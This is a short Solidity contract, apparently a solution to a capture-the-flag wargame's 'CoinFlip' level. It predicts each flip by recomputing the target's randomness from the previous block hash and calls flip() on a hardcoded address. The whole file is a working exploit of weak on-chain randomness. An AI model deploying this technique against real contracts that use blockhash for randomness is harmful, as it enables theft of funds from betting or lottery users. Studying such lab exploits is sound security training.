// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./math/SafeMath.sol";

contract CoinFlipPredictor {
  using SafeMath for uint256;

  uint256 FACTOR =
    57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address coinFlipAddress = 0x250183236e15dF685C56Bf9A50D673e17dD97707;

  function predictCoinFlip() public returns (bool side) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    side = coinFlip == 1 ? true : false;
    (bool success, ) = coinFlipAddress.call(
      abi.encodeWithSignature("flip(bool)", side)
    );
    require(success, "Could not predict.");
  }
}
